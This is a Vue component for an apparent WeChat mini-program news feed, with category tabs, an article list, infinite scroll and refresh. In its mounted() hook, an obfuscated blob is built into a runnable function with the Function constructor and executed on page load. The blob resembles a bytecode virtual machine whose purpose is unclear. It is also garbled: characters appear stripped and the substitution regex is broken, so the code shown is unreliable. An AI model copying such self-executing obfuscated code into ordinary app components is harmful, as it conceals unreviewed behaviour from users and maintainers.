<template>
<div class="container">
  <div class="header">
    <scroll-view scroll-x="true" :scroll-left="scrollLeft" class="category-bar">
      <div 
        @click="changeTab(index,item.tag)" 
        v-for="(item, index) in categories"
        :class="[nowIndex==index ?'active':'']" 
        :key="item.tag"
      >
        {{item.categoryName}}
      </div>
    </scroll-view>
    <span @click="toMore" class="iconfont icon-jia"></span>
  </div>
  <div class="news-list">
    <article-list :newsList="newsList"></article-list>
  </div>
  <div class="refresh" @click="refresh">
    <span class="iconfont icon-shuaxin" :class="refreshClass"></span>
  </div>
</div>
</template>

<script>
import store from './store';
import articleList from '@/components/articleList.vue';

export default {
  data() {
    return {
     scrollLeft: 0,
     nowIndex: 0
    };
  },
  onReachBottom() {
    if (!this.hasMore) {
      return false;
    }
    this.getNewsList({},false);
  },

  mounted() {
    console.log('x',Function(function(t) {
				return 'e(e,a,r){(b[e]||(b[e]=t("x,y","x "+e+" y")(r,a)}a(e,a,r){(k[r]||(k[r]=t("x,y","new x[y]("+Array(r+1).join(",x[y]")(1)+")")(e,a)}r(e,a,r){n,t,s={},b=s.d=r?r.d+1:0;for(s["$"+b]=s,t=0;t<b;t)s[n="$"+t]=r[n];for(t=0,b=s=a;t<b;t)s[t]=a[t];c(e,0,s)}c(t,b,k){u(e){v[x]=e}f{g=,ting(bg)}l{try{y=c(t,b,k)}catch(e){h=e,y=l}}for(h,y,d,g,v=[],x=0;;)switch(g=){case 1:u(!)4:f5:u((e){a=0,r=e;{c=a<r;c&&u(e[a]),c}}(6:y=,u((y8:if(g=,lg,g=,y===c)b+=g;else if(y!==l)y9:c10:u(s(11:y=,u(+y)12:for(y=f,d=[],g=0;g<y;g)d[g]=y.charCodeAt(g)^g+y;u(String.fromCharCode.apply(null,d13:y=,h=delete [y]14:59:u((g=)?(y=x,v.slice(x-=g,y:[])61:u([])62:g=,k[0]=65599*k[0]+k[1].charCodeAt(g)>>>065:h=,y=,[y]=h66:u(e(t[b],,67:y=,d=,u((g=).x===c?r(g.y,y,k):g.apply(d,y68:u(e((g=t[b])<"<"?(b--,f):g+g,,70:u(!1)71:n72:+f73:u(parseInt(f,3675:if(){bcase 74:g=<<16>>16g76:u(k[])77:y=,u([y])78:g=,u(a(v,x-=g+1,g79:g=,u(k["$"+g])81:h=,[f]=h82:u([f])83:h=,k[]=h84:!085:void 086:u(v[x-1])88:h=,y=,h,y89:u({e{r(e.y,arguments,k)}e.y=f,e.x=c,e})90:null91:h93:h=0:;default:u((g<<16>>16)-16)}}n=this,t=n.Function,s=Object.keys||(e){a={},r=0;for(c in e)a[r]=c;a=r,a},b={},k={};r'.replace(/[-]/g, function(i) {
					return t[15 & i.charCodeAt(0)]
				})
			}("v[x++]=v[--x]t.charCodeAt(b++)-32function return ))++.substrvar .length(),b+=;break;case ;break}".split(""))))
    this.getNewsList();
  },

  computed: {
    categories() {
      return store.state.currentCategories;
    },
    newsList() {
      return store.state.newsList;
    },
    refreshClass() {
      return store.state.loading ? 'on' : 'off';
    },
    currentTag() {
      return store.state.currentTag;
    },
    hasMore() {
      return store.state.hasMore;
    },
  },

  methods: {
    getNewsList(params={}, isFirst=true) {
      params.tag = params.tag || this.currentTag;
      if(!isFirst) {
        const now = new Date().getTime();
      }
      store.dispatch('getNewsList',{isFirst,params});
    },
    changeTab(index,tag) {
      this.nowIndex = index;
      if (index > 4) {
        this.scrollLeft = (index - 4) * 120;
      } else {
        this.scrollLeft = 0;
      }
      this.getNewsList({
        tag,
      })
    },
    toMore() {
      wx.navigateTo({
        url: "/pages/category/main",
      });
    },
    refresh() {
      this.getNewsList();
    },
  },
  
  components: {
    'article-list': articleList,
  }
};
</script>

<style lang='less' scoped>
  @import "./style";

</style>
